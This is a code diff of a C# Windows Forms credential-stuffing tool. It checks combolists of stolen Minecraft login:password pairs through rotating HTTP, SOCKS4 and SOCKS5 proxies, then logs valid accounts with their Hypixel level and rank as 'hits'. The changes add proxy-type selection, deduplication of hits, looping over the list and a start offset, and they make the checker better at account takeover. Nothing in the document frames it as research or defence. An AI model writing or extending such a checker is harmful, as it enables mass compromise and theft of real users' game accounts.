@@ -26,6 +26,7 @@ namespace WindowsFormsApp2
             InitializeComponent();
             Control.CheckForIllegalCrossThreadCalls = false;
             //AllocConsole();
+            comboBox1.SelectedIndex = 0;
         }
 
         private Object sync = new object();
@@ -42,15 +43,14 @@ namespace WindowsFormsApp2
             return (int)(exp < 0 ? 1 : Math.Floor(1 + REVERSE_PQ_PREFIX + Math.Sqrt(REVERSE_CONST + GROWTH_DIVIDES_2 * exp)));
         }
 
-        private int get_hypixel_level(string username, string proxy)
+        private string get_hypixel_data(string username, ProxyClient proxy)
         {
             using (var request = new HttpRequest())
             {
                 request.UserAgent = Http.ChromeUserAgent();
                 request.Cookies = new CookieDictionary(false);
                 request.IgnoreProtocolErrors = true;
-                if (proxy != string.Empty)
-                    request.Proxy = Socks4ProxyClient.Parse(proxy);
+                request.Proxy = proxy;
 
                 var response = string.Empty;
 
@@ -63,25 +63,50 @@ namespace WindowsFormsApp2
                 }
                 catch { }
 
-                if (response.Contains("networkExp"))
-                {
-                    var json = Json.Deserialize(response);
-                    return convert_to_level(Convert.ToDouble(json["player"]["networkExp"]));
-                }
-
-                return 0;
+                return response;
             }
         }
 
-        private string check_minecraft(string[] login, string proxy)
+        private int get_hypixel_level(string response)
+        {
+            if (response.Contains("networkExp"))
+            {
+                var json = Json.Deserialize(response);
+                return convert_to_level(Convert.ToDouble(json["player"]["networkExp"]));
+            }
+
+            return 0;
+        }
+
+        private string get_hypixel_rank(string response)
+        {
+            if (response.Contains("newPackageRank"))
+            {
+                var json = Json.Deserialize(response);
+
+                return Convert.ToString(json["player"]["newPackageRank"]);
+            }
+
+            return string.Empty;
+        }
+
+        private string check_minecraft(string[] login, string proxy_string)
         {
             using (var request = new HttpRequest())
             {
                 request.UserAgent = Http.ChromeUserAgent();
                 request.Cookies = new CookieDictionary(false);
                 request.IgnoreProtocolErrors = true;
-                if (proxy != string.Empty)
-                    request.Proxy = Socks4ProxyClient.Parse(proxy);
+
+                if (proxy_string != string.Empty)
+                {
+                    if (comboBox1.SelectedIndex == 0)
+                        request.Proxy = HttpProxyClient.Parse(proxy_string);
+                    if (comboBox1.SelectedIndex == 1)
+                        request.Proxy = Socks4ProxyClient.Parse(proxy_string);
+                    if (comboBox1.SelectedIndex == 2)
+                        request.Proxy = Socks5ProxyClient.Parse(proxy_string);
+                }
 
                 var response = string.Empty;
 
@@ -98,19 +123,30 @@ namespace WindowsFormsApp2
                     {
                         var json_data = Json.Deserialize(response);
 
-                        var hypixel_level = get_hypixel_level(Convert.ToString(json_data["selectedProfile"]["name"]), proxy);
+                        var name = Convert.ToString(json_data["selectedProfile"]["name"]);
 
-                        var lvi = new ListViewItem();
-                        lvi.Text = login[0];
-                        lvi.SubItems.Add(login[1]);
-                        lvi.SubItems.Add(Convert.ToString(json_data["selectedProfile"]["name"]));
-                        lvi.SubItems.Add(Convert.ToString(json_data["user"]["secured"]));
-                        lvi.SubItems.Add(Convert.ToString(hypixel_level));
+                        var hypixel_data = get_hypixel_data(name, request.Proxy);
 
-                        listView1.Items.Add(lvi);
-                        hitslabel.Text = (Convert.ToInt32(hitslabel.Text) + 1).ToString();
+                        var hypixel_level = get_hypixel_level(hypixel_data);
+                        var hypixel_rank = get_hypixel_rank(hypixel_data);
 
-                        hits.Add(login[0] + ":" + login[1] + " | " + (Convert.ToBoolean(json_data["user"]["secured"]) ? "NFA" : "SFA") + " | " + json_data["selectedProfile"]["name"] + " | Hypixel Level: " + hypixel_level);
+                        var hit_string = login[0] + ":" + login[1] + " | " + name + " | Level: " + hypixel_level + " | Rank: " + hypixel_rank;
+
+                        if (!hits.Contains(hit_string))
+                        {
+                            var lvi = new ListViewItem();
+                            lvi.Text = login[0];
+                            lvi.SubItems.Add(login[1]);
+                            lvi.SubItems.Add(Convert.ToString(name));
+                            //lvi.SubItems.Add(Convert.ToString(json_data["user"]["secured"]));
+                            lvi.SubItems.Add(Convert.ToString(hypixel_level));
+                            lvi.SubItems.Add(hypixel_rank);
+
+                            listView1.Items.Add(lvi);
+                            hitslabel.Text = (Convert.ToInt32(hitslabel.Text) + 1).ToString();
+
+                            hits.Add(hit_string);
+                        }
                     }
                     //else if (!checkBox1.Checked)
                     //{
@@ -151,8 +187,13 @@ namespace WindowsFormsApp2
                     if (account_counter < combolist.Count() - 1)
                         account_counter++;
                     else
-                        break;
-
+                    {
+                        if (checkBox1.Checked)
+                            account_counter = 0;
+                        else
+                            break;
+                    }
+                       
                     if (proxy_counter < proxylist.Count() - 1)
                         proxy_counter++;
                     else
@@ -174,7 +215,7 @@ namespace WindowsFormsApp2
             Directory.CreateDirectory("hits");
 
             is_stopping = false;
-            account_counter = 0;
+            account_counter = Convert.ToInt32(textBox2.Text);
             if (proxylist == null)
             {
                 MessageBox.Show("Load Proxy List", "Error");
